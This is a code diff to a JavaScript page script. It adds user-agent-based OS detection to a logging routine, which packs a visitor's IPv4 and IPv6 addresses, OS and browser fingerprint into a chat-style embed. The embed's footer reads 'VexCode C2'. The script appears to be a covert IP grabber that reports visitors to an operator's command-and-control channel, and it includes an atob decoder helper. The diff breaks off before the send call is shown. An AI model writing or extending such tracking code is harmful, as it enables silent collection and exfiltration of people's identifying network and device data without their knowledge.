@@ -55,6 +55,19 @@
     const _d = (s) => atob(s);
     let ip4 = "N/A", ip6 = "N/A";
 
+    // --- ADDED OS DETECTION ---
+    function getOS() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
+        if (ua.includes("Windows NT 6.1")) return "Windows 7";
+        if (ua.includes("Android")) return "Android Device";
+        if (ua.includes("iPhone")) return "iPhone (iOS)";
+        if (ua.includes("iPad")) return "iPad (iOS)";
+        if (ua.includes("Mac OS")) return "MacOS";
+        if (ua.includes("Linux")) return "Linux";
+        return "Unknown OS/Mobile";
+    }
+
     function getFingerprint() {
         const n = navigator;
         const s = screen;
@@ -64,10 +77,13 @@
 
     async function _log(title, cObj, color) {
         const fPrint = getFingerprint();
+        const osName = getOS(); // Get the OS here
+        
         const embed = {
             title: title,
-            description: `**IPv4:** \`${cObj.ip4}\`\n**IPv6:** \`${cObj.ip6}\`\n**ID:** \`${fPrint}\``,
+            description: `**IPv4:** \`${cObj.ip4}\`\n**IPv6:** \`${cObj.ip6}\`\n**OS:** \`${osName}\`\n**ID:** \`${fPrint}\``,
             color: color,
+            footer: { text: `VexCode C2 | Device: ${osName}` },
             timestamp: new Date()
         };
         try {
